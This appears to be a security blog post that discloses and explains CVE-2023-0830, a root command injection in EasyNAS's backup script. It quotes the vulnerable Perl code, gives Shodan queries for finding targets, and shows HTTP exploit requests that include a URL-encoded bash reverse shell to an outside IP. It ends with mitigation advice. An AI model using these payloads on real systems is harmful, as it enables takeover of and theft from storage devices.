<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"/><title>xbz0n@sh:~# <!-- -->Finding and Exploiting CVE-2023-0830 in EasyNas</title><meta name="description" content="Ivan Spiridonov (xbz0n) - Offensive security professional specializing in Red Teaming, Web/Mobile/AD Pentesting, and vulnerability research. Discover pentesting insights, exploit techniques, and security tools."/><meta property="og:type" content="article"/><meta property="og:url" content="https://xbz0n.sh/blog/cve-2023-0830"/><meta property="og:title" content="Finding and Exploiting CVE-2023-0830 in EasyNas"/><meta property="og:description" content="Recently, I discovered a vulnerability in a backup and restore script used in EasyNAS, a popular open-source network-attached storage solution. The vulnerabi..."/><meta property="twitter:card" content="summary_large_image"/><meta property="twitter:url" content="https://xbz0n.sh/blog/cve-2023-0830"/><meta property="twitter:title" content="Finding and Exploiting CVE-2023-0830 in EasyNas"/><meta property="twitter:description" content="Recently, I discovered a vulnerability in a backup and restore script used in EasyNAS, a popular open-source network-attached storage solution. The vulnerabi..."/><meta property="author" content="Ivan Spiridonov"/><link rel="canonical" href="https://xbz0n.sh/blog/cve-2023-0830"/><meta name="next-head-count" content="18"/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /><link rel="preload" href="/_next/static/css/d26a9e510d63e26e.css" as="style" crossorigin=""/><link rel="stylesheet" href="/_next/static/css/d26a9e510d63e26e.css" crossorigin="" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" crossorigin="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-fa99431b15635937.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/framework-fae63b21a27d6472.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/main-7f705b62e1c5c87e.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/_app-5894f79c417ecb15.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/260-e9b07f57f9f93770.js" defer="" crossorigin=""></script><script src="/_next/static/chunks/pages/blog/%5Bslug%5D-1de5799e67e53b51.js" defer="" crossorigin=""></script><script src="/_next/static/-GeIpzgY1ncd3AosHRXyb/_buildManifest.js" defer="" crossorigin=""></script><script src="/_next/static/-GeIpzgY1ncd3AosHRXyb/_ssgManifest.js" defer="" crossorigin=""></script><style data-href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap">@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKxjPg.woff) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8-qxjPg.woff) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbY2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8L6tjPg.woff) format('woff')}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:500;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx3cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0460-052F,U+1C80-1C8A,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxTcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxPcwgknk-6nFg.woff2) format('woff2');unicode-range:U+0370-0377,U+037A-037F,U+0384-038A,U+038C,U+038E-03A1,U+03A3-03FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx_cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPx7cwgknk-6nFg.woff2) format('woff2');unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'JetBrains Mono';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/jetbrainsmono/v23/tDbv2o-flEEny0FZhsfKu5WU4zr3E_BX0PnT8RD8yKwBNntkaToggR7BYRbKPxDcwgknk-4.woff2) format('woff2');unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style></head><body><div id="__next"><div class="flex flex-col min-h-screen"><nav class="bg-primary/80 backdrop-blur-sm sticky top-0 z-10 shadow-md"><div class="container py-4"><div class="flex items-center justify-between"><div class="flex items-center space-x-6"><a href="/"><span class="text-xl font-bold tracking-tighter bg-gradient-to-r from-accent to-blue-500 bg-clip-text text-transparent">xbz0n@sh:~#</span></a><div class="hidden md:flex space-x-6"><a class="nav-link" href="/">Home</a><a class="nav-link" href="/about">About</a><a class="nav-link" href="/blog">Blog</a><a class="nav-link" href="/tools">Tools</a><a class="nav-link" href="/cves">CVEs</a></div></div><div class="hidden md:flex items-center space-x-4"><a href="mailto:ivanspiridonov@gmail.com" class="text-gray-300 hover:text-accent" aria-label="Email"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"></path></svg></a><a href="https://github.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="GitHub"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 496 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a><a href="https://twitter.com/xbz0n" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="Twitter"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg></a><a href="https://www.linkedin.com/in/ivanspiridonov/" target="_blank" rel="noopener noreferrer" class="text-gray-300 hover:text-accent" aria-label="LinkedIn"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="w-5 h-5" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"></path></svg></a></div><button class="md:hidden focus:outline-none" aria-label="Toggle menu"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 448 512" class="h-6 w-6 text-gray-300" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z"></path></svg></button></div></div></nav><main class="flex-grow container py-8"><article class="max-w-3xl mx-auto"><a class="text-accent hover:text-accent/80 mb-8 inline-block" href="/blog">← Back to all posts</a><div class="mb-8"><h1 class="text-3xl md:text-4xl font-bold mb-4">Finding and Exploiting CVE-2023-0830 in EasyNas</h1><div class="flex items-center text-sm text-gray-400"><time dateTime="2023-03-18">March 18, 2023</time></div></div><div class="blog-content">
<h2>Introduction</h2>
<p>Recently, I discovered a vulnerability in a backup and restore script used in EasyNAS, a popular open-source network-attached storage solution. The vulnerability (published as <a href="https://vuldb.com/?id.220950">CVE-2023-0830</a>) allows for arbitrary command execution with root privileges. An attacker can use this to delete system files, steal sensitive data, or gain complete system access.</p>
<p>In this post, I'll show you how I found this vulnerability using Burp Suite and walk through the exploitation process. I'll also show the vulnerable code and explain what makes this such a dangerous flaw.</p>
<h2>Target Identification</h2>
<p>Vulnerable EasyNAS instances can be identified by their web interface running on ports 443 (HTTPS) or 80 (HTTP), featuring the "EasyNAS" branding on the login page. Use Shodan with queries like <code>title:"EasyNAS Login"</code> or scan for distinctive EasyNAS HTTP headers. This vulnerability affects EasyNAS version 1.1.0 and possibly earlier versions.</p>
<h2>Details of the Vulnerability</h2>
<p>The vulnerability exists in the backup and restore script used by EasyNAS. The script is written in Perl and is executed through the web interface. Here's the vulnerable code:</p>
<pre class="language-perl"><code class="language-perl">$rc=system("/usr/bin/sudo /usr/bin/tar cvf $mount_dir/$vol/$file @config_files > /dev/null" );
</code></pre>
<p>The problem is obvious - the script executes a system command using the <code>system()</code> function, and it includes user-controlled input (<code>$file</code> and <code>$vol</code> variables) without any sanitization. These variables come directly from GET parameters in the web interface, meaning we can inject our own commands.</p>
<p>What makes this vulnerability particularly dangerous is that the command is executed using <code>sudo</code>, giving the injected commands root privileges. Since the script itself already runs <code>tar</code> with sudo, any command we inject will inherit these elevated permissions.</p>
<h2>Discovery with Burp Suite</h2>
<p>Finding this vulnerability was surprisingly simple: I logged into the EasyNAS web interface with valid credentials, enabled Burp Suite's proxy to capture requests, and navigated to the backup feature. In Burp Suite, I noticed a GET request to <code>/easynas/backup.pl</code> with several parameters including <code>name</code> and <code>vol</code>. These parameters appeared to be directly incorporated into system commands without proper sanitization – a classic pattern that often leads to command injection vulnerabilities.</p>
<h2>Technical Exploitation Details</h2>
<h3>Command Injection Mechanics</h3>
<p>The exploitation leverages the way shell commands are parsed. The Perl script constructs a shell command using the variables <code>$file</code> and <code>$vol</code> directly in the command. When we inject the pipe character (<code>|</code>) into the <code>$file</code> variable, it breaks the command syntax and allows execution of a secondary command.</p>
<ol>
<li>
<p>The Perl script constructs a shell command like:</p>
<pre class="language-none"><code class="language-none">/usr/bin/sudo /usr/bin/tar cvf $mount_dir/$vol/$file @config_files > /dev/null
</code></pre>
</li>
<li>
<p>When we inject the pipe character (<code>|</code>) into the <code>$file</code> variable, it breaks the command syntax and allows execution of a secondary command. The full injected parameter structure:</p>
<pre class="language-none"><code class="language-none">|command|command||a #
</code></pre>
</li>
<li>
<p>Breaking this down:</p>
<ul>
<li>The first <code>|</code> terminates the original command and starts a new one</li>
<li>The second <code>|</code> pipes the output of the first command to the next command</li>
<li><code>||a</code> creates a fallback command that will run if the previous command fails (<code>a</code> is just a non-existent command)</li>
<li><code>#</code> comments out the remainder of the original command to prevent syntax errors</li>
</ul>
</li>
</ol>
<h3>Privilege Escalation Mechanism</h3>
<p>This vulnerability provides a direct privilege escalation path because the web interface runs the backup script with the permissions of the web server user, but the script uses <code>sudo</code> to execute the tar command without requiring a password. This sudo configuration allows the web server user to run this specific tar command with root privileges. When we inject our commands using the pipe character, they inherit the sudo context and execute with root privileges, even though they're technically separate from the original tar command.</p>
<h2>Exploitation Process Using Burp Suite</h2>
<p>I exploited the vulnerability by intercepting a legitimate backup request in Burp Suite that looked like:</p>
<pre class="language-none"><code class="language-none">GET /easynas/backup.pl?action=backup&#x26;menu=none&#x26;.submit=Backup&#x26;name=backup_20230209&#x26;vol=datastore HTTP/1.1
Host: easynas.local
Cookie: session_id=abcdef123456
</code></pre>
<p>The <code>name</code> parameter contained a filename used in the backup command, making it ideal for command injection. I modified the request in Burp Suite's Repeater tab, changing the <code>name</code> parameter to include command injection characters:</p>
<pre class="language-none"><code class="language-none">GET /easynas/backup.pl?action=backup&#x26;menu=none&#x26;.submit=Backup&#x26;name=%7cwhoami%7c%7ca%20%23&#x26;vol=datastore HTTP/1.1
</code></pre>
<p>When sent, the server response indicated successful command execution with root privileges. For a practical demonstration, I developed a final payload that establishes a reverse shell with root privileges:</p>
<pre class="language-none"><code class="language-none">GET /easynas/backup.pl?action=backup&#x26;menu=none&#x26;.submit=Backup&#x26;name=%7c/bin/bash%20%7c%20bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.25/443%200%3E%261%27%7c%7ca%20%23&#x26;vol=datastore HTTP/1.1
</code></pre>
<p>This payload uses URL encoding for special characters and works by breaking out of the original command, executing bash, piping to another bash instance that runs the reverse shell command, all with inherited root privileges from the sudo context of the vulnerable script.</p>
<h2>Real-World Attack Scenario</h2>
<p>In a real attack, an adversary would identify an EasyNAS instance through network scanning, authenticate using common credentials, and deploy the exploit to establish a reverse shell. With root access, they could exfiltrate all data stored on the NAS, install persistence mechanisms, pivot to other internal systems, or modify system configurations to maintain access. This vulnerability is particularly concerning for internet-exposed devices, as attackers could gain complete control of the storage system with minimal effort.</p>
<h2>Mitigation</h2>
<p>To fix this vulnerability, implement strict input validation with a whitelist approach, use prepared statements or parameterized APIs where possible, avoid using sudo in scripts (especially for web applications), implement proper privilege separation, and apply the principle of least privilege throughout the application. The fix could be as simple as using the Perl module CGI.pm's built-in param method to sanitize user input, or enabling Taint mode to treat all user input as potentially dangerous.</p>
<h2>Conclusion</h2>
<p>This vulnerability in EasyNAS shows how even seemingly minor implementation details can lead to critical security issues. What makes this vulnerability particularly interesting is how easily it was discovered using basic penetration testing tools, yet it was overlooked during development.</p>
<p>The lesson here is that proper input validation is critical, especially when user input is passed to system commands. Even in authenticated areas of applications, user input should never be trusted.</p>
<p>Keep your systems updated and be aware of vulnerabilities, even in open-source software like EasyNAS. Take the necessary steps to protect your systems - especially network storage devices that often contain your most sensitive data.</p>
<h2>References</h2>
<ul>
<li><a href="https://www.exploit-db.com/exploits/51266">EasyNAS 1.1.0 — Authenticated OS Command Injection Exploit (github.com)</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2023-0830">CVE-2023-0830</a></li>
<li><a href="https://vuldb.com/?id.220950">VulDB Entry 220950</a></li>
</ul>
<hr>
<p><em>Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.</em></p>
</div></article></main><footer class="bg-primary/90 border-t border-gray-800"><div class="container py-6"><div class="flex justify-center items-center"><div class="text-sm text-gray-400">© <!-- -->2025<!-- --> Ivan Spiridonov (xbz0n). All rights reserved.</div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json" crossorigin="">{"props":{"pageProps":{"postData":{"slug":"cve-2023-0830","contentHtml":"\n\u003ch2\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eRecently, I discovered a vulnerability in a backup and restore script used in EasyNAS, a popular open-source network-attached storage solution. The vulnerability (published as \u003ca href=\"https://vuldb.com/?id.220950\"\u003eCVE-2023-0830\u003c/a\u003e) allows for arbitrary command execution with root privileges. An attacker can use this to delete system files, steal sensitive data, or gain complete system access.\u003c/p\u003e\n\u003cp\u003eIn this post, I'll show you how I found this vulnerability using Burp Suite and walk through the exploitation process. I'll also show the vulnerable code and explain what makes this such a dangerous flaw.\u003c/p\u003e\n\u003ch2\u003eTarget Identification\u003c/h2\u003e\n\u003cp\u003eVulnerable EasyNAS instances can be identified by their web interface running on ports 443 (HTTPS) or 80 (HTTP), featuring the \"EasyNAS\" branding on the login page. Use Shodan with queries like \u003ccode\u003etitle:\"EasyNAS Login\"\u003c/code\u003e or scan for distinctive EasyNAS HTTP headers. This vulnerability affects EasyNAS version 1.1.0 and possibly earlier versions.\u003c/p\u003e\n\u003ch2\u003eDetails of the Vulnerability\u003c/h2\u003e\n\u003cp\u003eThe vulnerability exists in the backup and restore script used by EasyNAS. The script is written in Perl and is executed through the web interface. Here's the vulnerable code:\u003c/p\u003e\n\u003cpre class=\"language-perl\"\u003e\u003ccode class=\"language-perl\"\u003e$rc=system(\"/usr/bin/sudo /usr/bin/tar cvf $mount_dir/$vol/$file @config_files \u003e /dev/null\" );\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe problem is obvious - the script executes a system command using the \u003ccode\u003esystem()\u003c/code\u003e function, and it includes user-controlled input (\u003ccode\u003e$file\u003c/code\u003e and \u003ccode\u003e$vol\u003c/code\u003e variables) without any sanitization. These variables come directly from GET parameters in the web interface, meaning we can inject our own commands.\u003c/p\u003e\n\u003cp\u003eWhat makes this vulnerability particularly dangerous is that the command is executed using \u003ccode\u003esudo\u003c/code\u003e, giving the injected commands root privileges. Since the script itself already runs \u003ccode\u003etar\u003c/code\u003e with sudo, any command we inject will inherit these elevated permissions.\u003c/p\u003e\n\u003ch2\u003eDiscovery with Burp Suite\u003c/h2\u003e\n\u003cp\u003eFinding this vulnerability was surprisingly simple: I logged into the EasyNAS web interface with valid credentials, enabled Burp Suite's proxy to capture requests, and navigated to the backup feature. In Burp Suite, I noticed a GET request to \u003ccode\u003e/easynas/backup.pl\u003c/code\u003e with several parameters including \u003ccode\u003ename\u003c/code\u003e and \u003ccode\u003evol\u003c/code\u003e. These parameters appeared to be directly incorporated into system commands without proper sanitization – a classic pattern that often leads to command injection vulnerabilities.\u003c/p\u003e\n\u003ch2\u003eTechnical Exploitation Details\u003c/h2\u003e\n\u003ch3\u003eCommand Injection Mechanics\u003c/h3\u003e\n\u003cp\u003eThe exploitation leverages the way shell commands are parsed. The Perl script constructs a shell command using the variables \u003ccode\u003e$file\u003c/code\u003e and \u003ccode\u003e$vol\u003c/code\u003e directly in the command. When we inject the pipe character (\u003ccode\u003e|\u003c/code\u003e) into the \u003ccode\u003e$file\u003c/code\u003e variable, it breaks the command syntax and allows execution of a secondary command.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eThe Perl script constructs a shell command like:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e/usr/bin/sudo /usr/bin/tar cvf $mount_dir/$vol/$file @config_files \u003e /dev/null\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWhen we inject the pipe character (\u003ccode\u003e|\u003c/code\u003e) into the \u003ccode\u003e$file\u003c/code\u003e variable, it breaks the command syntax and allows execution of a secondary command. The full injected parameter 